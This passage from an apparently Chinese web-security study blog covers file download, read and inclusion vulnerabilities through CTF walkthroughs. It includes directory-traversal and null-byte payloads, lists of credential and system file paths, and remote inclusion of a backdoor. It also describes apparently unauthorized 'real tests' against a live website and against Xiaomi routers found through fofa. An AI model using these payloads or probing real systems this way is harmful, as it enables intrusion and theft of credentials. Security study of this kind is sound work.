src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image7.png" alt="image7"></p><h3 id="5-javaweb文件下载的代码解析"><a href="#5-javaweb文件下载的代码解析" class="headerlink" title="5.javaweb文件下载的代码解析"></a>5.javaweb文件下载的代码解析</h3><p>前端jsp超链接跳转：</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image8.png" alt="image8"></p><p>后端代码：</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image9.webp" alt="image9"></p><h3 id="6-文件下载漏洞可能出现的URL特点"><a href="#6-文件下载漏洞可能出现的URL特点" class="headerlink" title="6.文件下载漏洞可能出现的URL特点"></a>6.文件下载漏洞可能出现的URL特点</h3><p><strong>文件名：</strong></p><ul><li><p>read.xxx?filename=</p></li><li><p>down.xxx?filename=</p></li><li><p>readfile.xxx?file=</p></li><li><p>downfile.xxx?file=</p></li></ul><p><strong>参数值：</strong>文件下载</p><ul><li><p>../ ..\ .\ ./等</p></li><li><p>%00 ? %23 %20 .等</p></li></ul><p><strong>目录符号：</strong></p><p>&amp;readpath=、&amp;filepath=、&amp;path=、&amp;inputfile=、&amp;url=、&amp;data=、&amp;readfile=、&amp;menu=、META-INF= 、WEB-INF</p><h3 id="7-文件漏洞总结"><a href="#7-文件漏洞总结" class="headerlink" title="7.文件漏洞总结"></a>7.文件漏洞总结</h3><ul><li><p>文件被解析，则是文件包含漏洞</p></li><li><p>显示源代码，则是文件读取漏洞</p></li><li><p>提示文件下载，则是文件下载漏洞</p></li><li><p>下载或文件读取漏洞：对应文件：配置文件（数据库，平台，各种等）</p></li><li><p>windows系统特殊文件路径：</p></li></ul><p>C:\boot.ini //查看系统版本</p><p>C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件<br>C:\Windows\repair\sam //存储系统初次安装的密码C:\Program Files\mysql\my.ini //Mysql配置<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root C:\Windows\php.ini //php配置信息<br>C:\Windows\my.ini //Mysql配置信息</p><p>C:\Windows\win.ini //Windows系统的一个基本系统配置文件</p><ul><li>Linux系统特殊文件路径：</li></ul><p>/root/.ssh/authorized_keys</p><p>/root/.ssh/id_rsa</p><p>/root/.ssh/id_ras.keystore</p><p>/root/.ssh/known_hosts //记录每个访问计算机用户的公钥</p><p>/etc/passwd<br>/etc/shadow<br>/usr/local/app/php5/lib/php.ini //PHP配置文件<br>/etc/my.cnf //mysql配置文件<br>/etc/httpd/conf/httpd.conf //apache配置文件<br>/root/.bash_history //用户历史命令记录文件<br>/root/.mysql_history //mysql历史命令记录文件<br>/proc/mounts //记录系统挂载设备<br>/porc/config.gz //内核配置文件<br>/var/lib/mlocate/mlocate.db //全文件路径<br>/porc/self/cmdline //当前进程的cmdline参数</p><p><strong>注：可以结合各种协议调用来配合这些漏洞</strong></p><h2 id="二-znds-com——文件下载真实测试"><a href="#二-znds-com——文件下载真实测试" class="headerlink" title="二.znds.com——文件下载真实测试"></a>二.znds.com——文件下载真实测试</h2><h3 id="1-进入靶场-1"><a href="#1-进入靶场-1" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h3><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image10.png" alt="image10"></p><h3 id="2-下载文件，获取路径"><a href="#2-下载文件，获取路径" class="headerlink" title="2.下载文件，获取路径"></a>2.下载文件，获取路径</h3><p>下载路径：<a target="_blank" rel="noopener" href="http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMjAzMDEvdHhzcDE2MTU4XzkuMC4wLjEwMDdfZGFuZ2JlaS5hcGs=">http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMjAzMDEvdHhzcDE2MTU4XzkuMC4wLjEwMDdfZGFuZ2JlaS5hcGs=</a></p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image11.png" alt="image11"></p><p>对后面的参数值用BASE64解码</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image12.png" alt="image12"></p><p>下载后的文件名称</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3%5Cimage41.png" alt="image41"></p><p>因此这里已经弄清楚了下载流程，用大小写来测试一下操作系统（linux）</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image13.png" alt="image13"></p><p>尝试获取根目录下的index.php文件（猜测有）</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image14.png" alt="image14"></p><p>下载路径为：<a target="_blank" rel="noopener" href="http://down.znds.com/getdownurl/?s=Li4vLi4vaW5kZXgucGdw">http://down.znds.com/getdownurl/?s=Li4vLi4vaW5kZXgucGdw</a></p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image15.png" alt="image15"></p><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h3><p>1.下载漏洞在哪里测？2.下载漏洞怎么判断存在（参数名是否可以修改）3.加密解密</p><h2 id="三-RoadrCTF2019——文件读取真题复现"><a href="#三-RoadrCTF2019——文件读取真题复现" class="headerlink" title="三.RoadrCTF2019——文件读取真题复现"></a>三.RoadrCTF2019——文件读取真题复现</h2><p>靶场地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java">https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java</a></p><h3 id="1-进入靶场-2"><a href="#1-进入靶场-2" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h3><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image16.png" alt="image16"></p><p>点击help，发现有url文件传参，可能存在文件包含/下载漏洞</p><p>这里提示help.docx文件没有被发现（java一般文件下载以post方式提交）</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image42.png" alt="image42"></p><p>换成post方式提交，能够下载了</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image17.png" alt="image17"></p><p>抓包查看中间件（这里没有信息）</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image18.png" alt="image18"></p><p>大小写或者nmap判断操作系统（linux Apache Tomcat/8.5.24）</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image19.png" alt="image19"></p><h3 id="2-下载配置文件"><a href="#2-下载配置文件" class="headerlink" title="2.下载配置文件"></a>2.下载配置文件</h3><p><strong>WEB 配置文件 WEB-INF/web.xml的简介</strong></p><p>文件包含：配置servlet的基本信息，配置全局初始化参数，session过期时间，错误页面跳转等基本信息。（和PHP脚本不同，Javaweb文件有编译，文件一般写在class类里面，命名也不一样）</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image20.webp" alt="image20"></p><p>下载</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image21.png" alt="image21"></p><p>WEB-INF/web.xml文件分析（这里相当于获取到了网站的文件目录）</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image22.png" alt="image22"></p><h3 id="3-获取flag"><a href="#3-获取flag" class="headerlink" title="3.获取flag"></a>3.获取flag</h3><p>找class文件（在downloadcontroller里面）</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image23.png" alt="image23"></p><p>打开查看（获取到flag提示）</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image24.png" alt="image24"></p><p>得到flag</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image25.png" alt="image25"></p><h2 id="四-百度杯2017-二月-Zone——真题复现"><a href="#四-百度杯2017-二月-Zone——真题复现" class="headerlink" title="四.百度杯2017-二月-Zone——真题复现"></a>四.百度杯2017-二月-Zone——真题复现</h2><h3 id="1-进入靶场-3"><a href="#1-进入靶场-3" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h3><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image26.png" alt="image26"></p><h3 id="2-使用BP抓包各种操作"><a href="#2-使用BP抓包各种操作" class="headerlink" title="2.使用BP抓包各种操作"></a>2.使用BP抓包各种操作</h3><p>找弱口令发现登陆不了</p><p>意外的发现点击Mini-Zone获取到数据包</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image27.png" alt="image27"></p><p>将cookie中的login=0改为1就能实现登录</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image28.png" alt="image28"></p><p>然后出现了manage，点击后抓包，继续修改login=1</p><p>?module=index&amp;name=php这个可能是文件包含或者文件读取</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image29.png" alt="image29"></p><p>于是进入robots.txt，发现了flag.php</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image43.png" alt="image43"></p><p>尝试读取flag.php，没找到flag</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image30.png" alt="image30"></p><p>通过扫描工具扫描一些目录，查看后均没找到flag</p><p>尝试读取一下/etc/passwd，发现不行后再一层一层的用…/往上找，发现还是不行。这时候测试一下../是不是被过滤了，发现果然被过滤了。</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image31.png" alt="image31"></p><p>因此这里可以用…/./来绕过../的过滤。再次寻找/etc/passwd，还是没法读取。换个目录，读取nginx的配置文件试试，nginx的配置文件的位置可能不太一样，但可能性比较大的是/etc/nginx/nginx.conf</p><p>成功！</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image32.png" alt="image32"></p><p>注意最后一行包含的sites-enabled/default，进入之后就发现了目录遍历的漏洞</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image33.png" alt="image33"></p><p>这里面的autoindex on，即为允许目录浏览。因此我们可以进行目录遍历了。</p><p>怎么遍历呢？直接访问/online-movies../试试</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image34.png" alt="image34"></p><p>目录遍历成功。这时候我们根据配置文件里的其他信息可以知道/var/www/html是根目录，因此直接访问/var/www/html/flag.php就可以得到源码了。</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image35.png" alt="image35"></p><p>得到flag</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image36.png" alt="image36"></p><h2 id="五-小米路由器——文件读取真实测试"><a href="#五-小米路由器——文件读取真实测试" class="headerlink" title="五.小米路由器——文件读取真实测试"></a>五.小米路由器——文件读取真实测试</h2><h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a></p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image37.png" alt="image37"></p><h3 id="2-fofa等一些黑暗引擎搜索小米路由器的用户"><a href="#2-fofa等一些黑暗引擎搜索小米路由器的用户" class="headerlink" title="2.fofa等一些黑暗引擎搜索小米路由器的用户"></a>2.fofa等一些黑暗引擎搜索小米路由器的用户</h3><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image38.png" alt="image38"></p><h3 id="3-测试读取root文件"><a href="#3-测试读取root文件" class="headerlink" title="3.测试读取root文件"></a>3.测试读取root文件</h3><p>/api-third-party/download/extdisks../etc/shadow（测试都失败了）</p><p>别人有读取成功的</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image39.webp" alt="image39"></p><p>查看文件</p><p><img src="/2022/03/07/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/image40.webp" alt="image40"></p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/" class="post-title-link" itemprop="url">文件操作之文件包含漏洞全解</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-03-01 20:09:32" itemprop="dateCreated datePublished" datetime="2022-03-01T20:09:32+08:00">2022-03-01</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-03-08 20:47:33" itemprop="dateModified" datetime="2022-03-08T20:47:33+08:00">2022-03-08</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>4.2k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>4 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="文件操作之文件包含漏洞全解"><a href="#文件操作之文件包含漏洞全解" class="headerlink" title="文件操作之文件包含漏洞全解"></a>文件操作之文件包含漏洞全解</h1><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image1.webp" alt="image1"></p><h2 id="一-文件包含漏洞原理简介"><a href="#一-文件包含漏洞原理简介" class="headerlink" title="一.文件包含漏洞原理简介"></a>一.文件包含漏洞原理简介</h2><h3 id="1-文件包含各个脚本代码"><a href="#1-文件包含各个脚本代码" class="headerlink" title="1.文件包含各个脚本代码"></a>1.文件包含各个脚本代码</h3><p><code>&lt;!==#include file=”1.asp”--&gt;</code></p><p><code>&lt;!==#include file=”top.aspx”--&gt;</code></p><p><code>&lt;c:import url=”http://thief.one/1.jsp”&gt;</code></p><p><code>&lt;% include file=”head.jsp”%&gt;</code></p><p><code>&lt;jsp:include page=”head.jsp”/&gt;</code></p><p><code>&lt;?php include(‘test.php’)?&gt;</code></p><h3 id="2-文件包含原理"><a href="#2-文件包含原理" class="headerlink" title="2.文件包含原理"></a>2.文件包含原理</h3><p>传递一个参数（可以是一个文件），然后PHP脚本包含这个文件，则无论这个文件是什么格式，访问PHP脚本，传递参数的文件都能以PHP格式执行。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image2.png" alt="image2"></p><h3 id="3-无限制的本地文件包含测试"><a href="#3-无限制的本地文件包含测试" class="headerlink" title="3.无限制的本地文件包含测试"></a>3.无限制的本地文件包含测试</h3><p>php脚本路径下存在一个1.txt文件</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image3.png" alt="image3"></p><p>访问php脚本并且传递1.txt文件为参数，这样会将这个txt文件以php格式执行</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image4.png" alt="image4"></p><p>单纯的访问txt文件</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image5.png" alt="image5"></p><p>跨越二级目录（运行phptutorial目录下的newfile.txt文件）</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image6.png" alt="image6"></p><h3 id="4-有限制的本地文件包含"><a href="#4-有限制的本地文件包含" class="headerlink" title="4.有限制的本地文件包含"></a>4.有限制的本地文件包含</h3><p>脚本代码（filename后面增加了一个html）</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image7.png" alt="image7"></p><p>传入newfile.txt文件参数（执行失败，因为在当前目录不存在1.txt.html文件）</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image8.png" alt="image8"></p><p><strong>绕过方式1：%00截断（条件：magic_quotes_gpc=off;php版本&lt;5.3.4）</strong></p><p>在url中%00表示ascii码中的0，而ascii中作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已经结束。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image9.png" alt="image9"></p><p><strong>绕过方式2：长度截断（更推荐）</strong></p><p>原理是垃圾数据溢出</p><p>windows中点号需要长于256位（文件命名），Linux中点号需要长于4096位 。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image10.png" alt="image10"></p><h3 id="5-远程文件包含代码测试"><a href="#5-远程文件包含代码测试" class="headerlink" title="5.远程文件包含代码测试"></a>5.远程文件包含代码测试</h3><p>在phpinfo中查看是否可以远程文件包含(allow_url_include这里关闭了)</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image11.png" alt="image11"></p><p>在参数开关中打开</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image12.png" alt="image12"></p><p>已开启</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image13.png" alt="image13"></p><p>在外网服务器上设置一个脚本</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image14.png" alt="image14"></p><p>远程包含该文件（有过滤，同样的在末尾加%00截断，加%23和%20和?都可以），实战情况下就可以将phpinfo换成远程后门文件，然后用菜刀连接。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image15.png" alt="image15"></p><h2 id="二-各种协议流提交流测试"><a href="#二-各种协议流提交流测试" class="headerlink" title="二.各种协议流提交流测试"></a>二.各种协议流提交流测试</h2><h3 id="1-各种协议在脚本下的运行状况（常用的http，https，file，ftp协议）"><a href="#1-各种协议在脚本下的运行状况（常用的http，https，file，ftp协议）" class="headerlink" title="1.各种协议在脚本下的运行状况（常用的http，https，file，ftp协议）"></a>1.各种协议在脚本下的运行状况（常用的http，https，file，ftp协议）</h3><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image16.webp" alt="image16"></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image17.webp" alt="image17"></p><h3 id="2-协议对于远程文件包含漏洞的利用条件（此处举php支持的伪协议例子）"><a href="#2-协议对于远程文件包含漏洞的利用条件（此处举php支持的伪协议例子）" class="headerlink" title="2.协议对于远程文件包含漏洞的利用条件（此处举php支持的伪协议例子）"></a>2.协议对于远程文件包含漏洞的利用条件（此处举php支持的伪协议例子）</h3><p><strong>file://——访问本地文件系统</strong></p><p><img 